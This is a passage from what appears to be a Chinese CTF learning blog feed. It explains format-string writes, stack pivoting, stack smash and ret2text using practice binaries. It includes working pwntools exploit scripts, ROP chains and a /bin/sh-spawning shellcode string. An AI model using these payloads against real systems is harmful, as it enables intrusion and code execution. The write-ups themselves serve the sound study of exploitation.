表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值。</li></ul><p>最终得到exp：（函数构造也要写在exp里的，这里防止啰嗦就不写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn imort *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br><span class="hljs-built_in">print</span> payload<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后结果：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show3.png"></p><hr><p>格式化字符串基础部分over!😎</p><p>格式的Length部分真的是花了我好久才搞明白什么意思，中文网站上都是直译英文，去英文网站用尽毕生英语所学才搞懂😨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不那么菜菜的ROP</title>
    <link href="/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的不那么简单小玩意们</p><span id="more"></span><h1 id="Stack-pivoting"><a href="#Stack-pivoting" class="headerlink" title="Stack pivoting"></a>Stack pivoting</h1><p>stack pivoting (堆栈转移)，基本思想是利用已有的内存区域或数据结构（例如堆）来构造一个新的堆栈，然后将程序的控制流转移到该堆栈上执行。通过将堆栈指针 (ESP&#x2F;RSP) 设置为新的堆栈地址，并在该堆栈上构造合适的函数调用帧，可以控制程序的执行路径。</p><p>通常在内存布局受限或某些保护机制存在的情况下使用。</p><p>利用stack pivoting有以下几个特征：</p><ul><li>栈可以控制的空间过小不足以构造完整的rop链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域</li></ul><p>说到底栈迁移就是 <code>&#39;a&#39;*offset+p64(fake_stack)+P64(leave)</code></p><p>首先我们需要了解函数在执行结束后会执行的 <code>leave;ret</code> 这条汇编代码的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># leave, 相当于执行<br>mov esp, ebp<br>pop ebp<br><br># retn, 相当于执行<br>pop eip<br><br>#执行leave指令后，首先绘将ebp的值赋给esp，然后做一个出栈操作，栈指针会向栈底移动一个地址。此时执行ret，就会跳转到新的栈顶指针的地址，即原ebp+8处存储的地址。<br></code></pre></td></tr></table></figure><p>在实际的程序汇编代码中，我们还需要利用如下图所示的代码：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-08-10_15-57-09.png"></p><p><code>rax, [rbp+buf]</code> 我们要知道这句汇编在干嘛，其实就是把 rbp+buf 的地址给到 rax。我们都知道栈溢出是先溢出到 rbp 再到 rip 的，我们可以通过栈溢出的方式控制 rbp 的值，在下面又将会把 rax 的值赋给 rsi ，通过这条汇编命令我们就可以控制 rbp 和 rsi 。</p><p>像上图的例子，假设我们通过溢出控制了 rbp 为 0x123000，那么 read 命令就相当于在执行 <code>read(0,0x123000+buf,xx)</code> ，也就是读入的数据被写入了 0x123000。至此我们就可以实现任意地址的写入。</p><p>但是这样<strong>只适用于我们只利用一次漏洞的情况</strong>，如果我们多次利用漏洞就需要为程序完整的构造一个栈结构，实现 “ 把栈搬走 ” 。</p><p>大致的通用思路就是：</p><ul><li><p>第一次栈迁移修改 rbp 让接下来的输入指向我们想要写的地方</p></li><li><p>第二次栈迁移修改 rsp 让程序正常</p></li><li><p>第三次栈迁移进行攻击 rop 链的构造（例如泄露 libc ，修改 GOT 地址，在栈上布置 shell rop 链）</p></li><li><p>第四次重复第一次的操作</p></li><li><p>第五次构造 getshell rop 链</p></li></ul><blockquote><p>如果需要进行多次 rop 攻击，除了最后一次都需要重复 1、2 操作恢复栈结构</p></blockquote><h4 id="🌰-1："><a href="#🌰-1：" class="headerlink" title="🌰_1："></a>🌰_1：</h4><p>发现了一个靶场：<a href="https://ropemporium.com/">ROP Emporium</a>，选择pivot-x_86</p><p>给的压缩包里还有一个动态链接库 <code>libpivot32.so</code>，checksec 一下甚至出现了没见过的玩意 <code>RUNPATH:  &#39;.&#39;</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">RUNPATH:</span>  <span class="hljs-string">&#x27;.&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>这个  RUNPATH:  ‘.’  的意思是可执行文件的运行时路径（run-time search path）设置为当前目录（’.’），也就是它运行时会使用题目所给的动态链接库</p></blockquote><p>直接在linux里运行一下看看，这个程序有有两个输入。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-19-28.png"></p><p>反编译一下这个程序的main函数，复制一下源码写个注释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pivot by ROP Emporium&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;x86\n&quot;</span>);<br>  ptr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000000</span>u);  <span class="hljs-comment">//分配一个0x1000000u的内存块，并将其地址赋值给ptr指针</span><br>  <span class="hljs-keyword">if</span> ( !ptr )  <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Failed to request space for pivot stack&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;  <span class="hljs-comment">//检查内存分配是否成功，如果失败则输出错误信息并退出程序。</span><br>  <span class="hljs-built_in">pwnme</span>(ptr + <span class="hljs-number">16776960</span>);  <span class="hljs-comment">//调用pwnme函数，将ptr指针偏移16776960字节的位置作为参数传递给它。</span><br>  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放先前分配的内存块</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nExiting&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现main函数里没有什么漏洞可以被我们利用，但是在<code>pwnme</code>函数里发现<code>read()</code>没有输入长度的验证</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-26-26.png"></p><p>其中在第二个输入溢出时，只有<code>(0x38-0x28-4)</code>即12个字节的缓冲区可以利用，无法直接在栈上构造rop链。题目也有提示，我们需要将rop链存到buf中，再将栈转移到buf上。</p><p>我们发现puts一条文本<code>Call ret2win() from libpivot</code>，没有在这个可执行文件中发现这个函数，但是题目还给了一个动态链接库 <code>libpivot32.so</code>，发现这是一个后门函数，我们可以控制程序跳转到这里执行为我们打开flag。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-33-31.png"></p><p>需要注意的是程序执行到我们填入的<code>leave;ret</code>指令之前，自己也执行了一次该指令。也就是说这个指令被执行了两次</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-04_15-45-03.png"></p><p>由于每次ret都会使得esp+4，所以，伪造的ebp的地址要减去4。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./pivot32&quot;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pivot32&#x27;</span>)<br>lib_elf=ELF(<span class="hljs-string">&#x27;./libpivot32.so&#x27;</span>)<br><br>func_plt=elf.plt[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>func_got_plt=elf.got[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>foothold_sym=lib_elf.symbols[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>ret2win_sym=lib_elf.symbols[<span class="hljs-string">&#x27;ret2win&#x27;</span>]<br>offset=<span class="hljs-built_in">int</span>(ret2win_sym-foothold_sym)<br><br>leave_ret=<span class="hljs-number">0x080486a8</span><br>mov_eax_eax=<span class="hljs-number">0x080488c4</span><br>pop_eax=<span class="hljs-number">0x080488c0</span><br>pop_ebx=<span class="hljs-number">0x08048571</span><br>add_eax_ebx=<span class="hljs-number">0x080488c7</span><br>call_eax=<span class="hljs-number">0x080486a3</span><br><br>p.recvuntil(<span class="hljs-string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)<br>fake_ebp=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><br>payload1=p32(func_plt)+p32(pop_eax)+p32(func_got_plt)+p32(mov_eax_eax)+p32(pop_ebx)+p32(offset)+p32(add_eax_ebx)+p32(call_eax)<br><br><span class="hljs-comment">#这里需要先调用一次foothold_function，将它的地址加载到got.plt中，我们才能进行后续的替换</span><br><span class="hljs-comment">#payload含义为，将eax赋值为foothold_function的真实地址，再将ebx赋值为foothold_function和ret2win的偏移，最后将ebx加到eax上，调用ret2win</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload1)<br><br>payload2=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span>+p32(fake_ebp-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p> [X-CTF Quals 2016 - b0verfl0w](<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w) </p><p>题目拿到手先查看一下基本信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-27-21.png"></p><p>查看一下源码发现vul函数有栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-39-53.png"></p><p>但是可控制的范围很小只有50-32-4&#x3D;14个字节，我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。</p><p>构造完shellcode之后，我们需要对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>查找一下可以利用的gadget</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-46-47.png"></p><p>其中<code>0x08048504</code>有直接跳转到esp的片段，</p><p>修改栈上的返回地址为<code>jmp esp</code>的地址，这样程序就会跳转到栈顶指针所指向的地址处执行payload。</p><p>构造结构如下：</p><p>shellcode+padding&#x3D;0x20，fake ebp&#x3D;0x4，jmp_esp&#x3D;0x4</p><p>为了保证栈上有足够的空间执行payload，我们能将栈指针向下调整，即sub esp, 0x28;jmp esp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./b0verfl0w&#x27;</span>)<br><br>jum_esp=<span class="hljs-number">0x08048504</span><br><br>Shellcode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br>Payload=Shellcode+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(jum_esp)+asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><br><span class="hljs-comment">#先利用sub esp, 0x28;jmp esp指令跳转到调整后的栈顶，再向上面写入shellcode，最后再次执行jum_esp跳转执行shellcode  </span><br><br>r.sendline(Payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><p>canary保护有多种绕过方式，其中Stack smash就是绕过canary保护的一种方式。之前做过的canary保护绕过是填充canary最后的字节并之后暴力枚举或是直接泄露，从而避免canary保护程序报错。Stack smash这个方法并不在乎是否会引发canary报错，而是利用报错的内容。</p><p>在程序启动canary保护之后，如果发现canary被修改的话就会执行 <code>_stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下这个指针指向程序名。如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串地址，那么在 <code>_fortify_fail</code> 函数中就会输出我们想要的信息。</p><blockquote><p>这个方法适用于glibc-2.31以前的程序，之后的程序不会打印 argv[0] 指针所指向的字符串</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>以2015年32C3 CTF readme 为例</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">2015 32C3 CTF readme</a></p><p>触发canary保护后程序会输出一段报错  </p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_16-51-08.png"></p><p>开始解题，反汇编一下源码。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-14-00.png"></p><p>程序中有两次输入，第一次输入赋值给v3后不对其进行任何操作；第二次输入赋值给v1，将其不断赋值给byte_600D20这个数组。</p><p>双击查看数组</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-16-59.png"></p><p>也就是说这道题我们只需要拿flag而不是拿shell，而且v2变量接收第二次输入的字符串，并且会不断覆盖原有的flag内容。</p><p>在这之后还有一条语句</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">int</span>)v0 + <span class="hljs-number">6294816LL</span>), <span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">32</span> - v0));<br></code></pre></td></tr></table></figure><p> 这条伪代码的原型是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">int</span> value, <span class="hljs-type">size_t</span> num)</span></span>;<br></code></pre></td></tr></table></figure><p>意思是从内存指针ptr指向的位置直到向后num字节都被value取代。</p><p>结合 <code>byte_600D20[v0++] = v1;</code> ，我们题目中的函数意思就是无论你是否进行第二次输入，在程序结束后 flag 的位置都将被替换，我们就无法通过直接修改 argv[0] 的值获得 flag 。</p><p>但是flag被映射了两次，0x600D21中的flag被修改，那我们就把 argv[0] 指向 0x400d21。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_16-02-26.png"></p><blockquote><p>看了很多大佬的解析也没搞明白，程序中有两个load段，为什么第二个load段中的flag，会被映射到第一个load 段里🥲</p></blockquote><p>查找argv[0]的位置，一共找到三种方法：</p><ul><li>方法一：</li></ul><p>用peda挂载文件，先在第一个gets处下断点</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-37-25.png"></p><p>利用find命令查找与文件名有关的地址，再计算当前的rsp指针与其的距离</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-42-28.png"></p><ul><li>方法二</li></ul><p>也是利用argv[0]指向程序名的特点寻找，直接下断点，查找指向程序名的内存指针。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-46-20.png"></p><ul><li>方法三</li></ul><p>用命令<code>p &amp; __libc_argv[0]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gdb">&gt; p &amp; __libc_argv[0]<br>$1 = (char **) 0x7fffffffdff8<br></code></pre></td></tr></table></figure><p>我们要写入536个字节也就是0x218个字节才能将argv[0]覆盖掉，所以payload构成应该是0x218字节的填充物加上我们目标flag的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x400d20</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Please overwrite the flag:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;Modifier&#x27;</span>)<br><br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p>但是没有输出，是因为程序把错误信号发送给了执行程序的终端里，我们需要修改环境变量让错误信息通过网络传到我们的终端里。</p><p>所以我们要利用第二次的输入，将 <code>LIBC_FATAL_STDERR_=1</code> 写入到环境变量中。在第一个payload当中我们已经把指针指向了argv[0]，需要将指针再次指向第二次输入点，结果如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)</span><br><br><span class="hljs-variable">payload_1</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x218</span> + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x400d20</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x600d20</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_1</span>)<br><br><span class="hljs-variable">payload_2</span> = <span class="hljs-string">&quot;LIBC_FATAL_STDERR_=1&quot;</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_2</span>)<br><br><span class="hljs-variable">print</span> <span class="hljs-variable">p.recvall</span>()<br></code></pre></td></tr></table></figure><hr><p>原来栈溢出不是想象中的辣么简单捏</p><p>栈上的东西终于整理好噜😊</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>真的很菜菜的ROP</title>
    <link href="/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的简单小玩意们</p><span id="more"></span><hr><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming，面向返回编程），其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>实施ROP的条件</strong></p><ul><li>程序存在栈溢出，且可以控制返回地址</li><li>可以找到满足程序的 gadgets 以及相应的 gadgets 的地址</li></ul><blockquote><p>都是copy来的）看到有的人说这个叫“面向返回地址”编程哈哈。</p></blockquote><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码(.text)，比如<code>system(&quot;/bin/sh&quot;)</code>或者<code>system(&quot;cat flag&quot;)</code>。我们需要做的就是把这些代码段的调用地址覆盖到返回地址上。</p><p>我们在控制程序执行的时候也可以控制程序执行好几段不相邻的已有代码，这是我们需要知道对应返回的代码的位置。程序如果开启了某些保护，我们就需要想办法去绕过它。</p><h4 id="🌰-1"><a href="#🌰-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-14-08.png"></p><p>使用ida反编译main函数，发现gets()语句，可以利用栈溢出</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-30-17.png"></p><p>而后我们在secure中可以找到调用<code>system(&#39;&quot;/bin/sh&quot;)</code>的代码，如果我们控制程序返回到这个指令，就可以获得系统的shell</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-31-37.png"></p><p>查看代码地址为0x0804863A，接下来构造playload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>来自CTFHUB的ret2text ，我不知道怎么复制题目链接，自己点进去找叭<a href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p><p>查看文件信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-47-25.png"></p><p>拖进32位IDA反编译发现main函数存在gets栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-51-25.png"></p><p>shift+F12打开字符串窗口发现&#x2F;bin&#x2F;sh语句</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-56-54.png"></p><p>去到对应的语句部分可以发现该程序将&#x2F;bin&#x2F;sh放到了rdi后，并且调用了sysytem</p><p><img 